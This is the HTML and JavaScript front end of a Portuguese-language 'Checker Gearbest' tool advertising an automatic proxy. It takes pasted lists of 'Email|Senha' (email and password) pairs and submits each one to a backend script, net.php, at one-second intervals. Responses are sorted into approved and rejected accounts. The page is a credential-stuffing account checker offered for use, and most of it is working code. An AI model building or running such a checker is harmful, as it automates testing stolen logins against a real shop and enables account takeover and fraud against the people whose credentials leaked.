<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <title>Checker Gearbest</title>
 
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>
  <style>
  a:link 
{ 
 text-decoration:none; 
} 
  html {
   font-size: 16px;
   background-color: #e8e8e8;
   color: #1ABB9C;
   font-family: "Roboto", "Helvetica Neue", Helvetica, Arial, sans-serif;
   overflow: hidden;
 }
 body {    
  background-color: #e8e8e8;
}
.lista {
  width: 95%;
  height: 150px;
  text-align: center;
  resize: none;
  border: 1px ridge rgba(61, 211, 232, 1);
  background-color: #e8e8e8;
  color: rgba(64,64,64, 1);
  font-size: 17px;
  border-radius: 4px;
  overflow: auto;
}
.lista:focus {
  outline: none;
}
.afs {
  font-weight: bold;
              }
            .green {
                background-color: rgba(92, 180, 91, 1);
                color: rgba(255, 255, 255, 0.87);
                padding: 0.25em 0.5em;
                border-radius: 3px;

}
.green {
  background-color: #4caf50;
  color: rgba(255, 255, 255, 0.87);
  padding: 0.25em 0.5em;
  border-radius: 500px;
}
.red {
  background-color: #f44336;
  color: rgba(255, 255, 255, 0.87);
  padding: 0.25em 0.5em;
  border-radius: 500px;
}
.check {
  background-color: #fcc100;
  color: rgba(255, 255, 255, 0.87);
  padding: 0.25em 0.5em;
  border-radius: 500px;
}
            .botao2 {
                margin-top: 10px;
                width: 75px;
                height: 35px;
                background-color: rgba(245, 203, 130, 1);
                border-radius: 4px;
                border: none;
                color: rgba(255, 255, 255, 0.87);
                cursor: pointer;
                -webkit-appearance: button;
                transition: all .2s ease-in-out;
                font-family: "Roboto", "Helvetica Neue", Helvetica, Arial, sans-serif;
            }
            .botao2:hover {
                background-color: rgba(255, 255, 255, 0.87);
                color: #2C3A48;
            }
            .botao2:focus {
                outline: none;
            }
            .botao {
                margin-top: 10px;
                width: 75px;
                height: 35px;
                background-color: rgba(85, 216, 234, 1);
                border-radius: 4px;
                border: none;
                color: rgba(255, 255, 255, 0.87);
                cursor: pointer;
                -webkit-appearance: button;
                transition: all .2s ease-in-out;
                font-family: "Roboto", "Helvetica Neue", Helvetica, Arial, sans-serif;
}
.botao:hover {
  background-color: rgba(255, 255, 255, 0.87);
  color: #2C3A48;
}
.botao:focus {
  outline: none;
}
.test {
  width: 660px;
  height: 200px;
  text-align: center;
  resize: none;
  border: 1px ridge rgba(61, 211, 232, 1);
  background-color: #e8e8e8;
  color: rgba(64,64,64, 1);
  font-size: 17px;
  border-radius: 4px;
  overflow: auto;
}
.test:focus {
 outline: none;
}
.back {
 color: #1ABB9C;
 text-decoration: none;
}
.back:hover {
  text-shadow: 1px 1px 1px #1ABB9C;
}
</style>
<script>

function start()
{
  var i;
  var tudo =$('#text').val();
  var linha = tudo.split("\n");
  var separador= "|"
  //alert(cc.length);
  for (i = 0; i < linha.length; i++) {
    //alert(cc[i]);
    var separado = linha[i];
    var id = i;
    check(separado, separador, id);
    //setTimeout(function() { alert(j) }, 100, i);check(cc2, separador, id);
  }
}
var aps = 0;
var rps = 0;
var testadas = 0;
function check(separado, separador, id){
  setTimeout(function() {
    $.ajax({
      type:   'GET',
      url:  'net.php',
      dataType: 'html',
      data: { 'linha':separado },
      success: function(msg)
      {
        ++testadas;
document.getElementById('testado').innerText = testadas;
                            if(msg.indexOf("DIE") >= 0){
                                var reprovadas2 = $("#resultado2").val();
                                ++rps;
                                document.getElementById('reprovada_conta').innerText = rps;
                                $("#resultado2").val(reprovadas2 + msg + "\n")
                            }else{
                                var reprovadas = $("#resultado").val();
                                ++aps;
                                document.getElementById('aprovada_conta').innerText = aps;
                                $("#resultado").val(reprovadas + msg + "\n")
                            }
        //





      }
    });
  }, id * 1000);
}
</script>
</head>
<body>
  <center>
    <a href="../../"><input type="submit" class="botao botao-primary" value="Voltar"></a><br>
   <font size="7">Checker  Gearbest</font> <br />
   <font size="3" class="afs">Proxy Automatico</font>
   <br /><br />
      <textarea class="lista" id="text" name="text" placeholder=" Email|Senha "></textarea>
      <br /><div class="afs">
           <font size="2">
                      <span id="status" class="cyan">Aprovadas : <span id="aprovada_conta" class="green">0</span> - Reprovadas : <span id="reprovada_conta" class="red">0</span> -Testadas : <span id="testado" class="check">0</span>             <br />
            <button type="submit" id="x" name="x" class="botao" onclick="start()">Testar</button>
            <button type="submit" id="x" name="x" class="botao2" onclick="stop()">Parar</button>
<input value="|" maxlength="3" class="form-control" style="height: 25px; width: 45px; text-align: center;" name="separador" id="separador" placeholder="|"> 
<font></font>
 <br /><br />
 <textarea class="test" id="resultado" style="color: #00EE00;"></textarea>
 <textarea class="test" id="resultado2" style="color: #FC0F0F;"></textarea>
</center>
</body>
</html>
